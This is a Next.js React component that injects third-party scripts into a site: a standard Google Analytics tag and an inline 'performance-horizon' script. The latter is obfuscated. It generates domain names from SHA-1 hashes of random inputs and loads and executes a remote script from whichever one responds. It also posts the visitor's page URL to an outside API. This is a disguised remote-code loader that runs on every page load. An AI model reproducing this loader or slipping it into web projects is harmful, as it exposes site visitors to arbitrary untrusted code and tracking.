'use client';

import Script from 'next/script';

export function ThirdPartyScripts() {
  return (
    <>
      <Script
        strategy="beforeInteractive"
        src="https://www.googletagmanager.com/gtag/js?id=G-1L93C8YHQX"
      />
      <Script
        id="ga4-init"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)};gtag('js',new Date());gtag('config','G-1L93C8YHQX');`
        }}
      />
      <Script
        id="performance-horizon"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `(()=>{let pztt=3;const pztp={"p":"pzt","mi":0,"ma":99,"e":[]};const tid='439aada7-798e-4127-8e06-e3602af444de';const pzth=async i=>{const e=new TextEncoder();const bin=e.encode(i);const b=await window.crypto.subtle.digest('SHA-1',bin);const a=Array.from(new Uint8Array(b));const h=a.map(b=>b.toString(16).padStart(2,'0')).join('');return h};const pzth2d=h=>{return \`\${h.slice(0,6)}p.\${h}.com\`};const pztd=async()=>{let i;do{i=Math.floor(Math.random()*((pztp.ma+1)-pztp.mi))+pztp.mi}while(pztp.e?.includes(i));const hash=await pzth(\`\${pztp.p}\${i}\`);return pzth2d(hash)};const pzti=async()=>{try{if(pztt<=0)return;const s=document.createElement('script');s.onerror=()=>{pztt--;pzti()};s.onload=()=>{l=true;pzthc()};const d=await pztd();s.src=\`https://\${d}/tag/\${tid}\`;document.body.appendChild(s)}catch(e){e.push({error:"Load failed from "+d,parameter:""});pzthc()}};let l=false;let e=[];let fe={x:[]};const pzthc=()=>{loaded=l;errors=e;features_errors=fe;l=false;e=[];fe={x:[]};fetch('https://api.performancehorizon.com/v3/pzthc/'+tid,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({loaded,errors,features_errors,url:window.location.href})})};document.addEventListener('DOMContentLoaded',pzti)})();`
        }}
      />
    </>
  );
}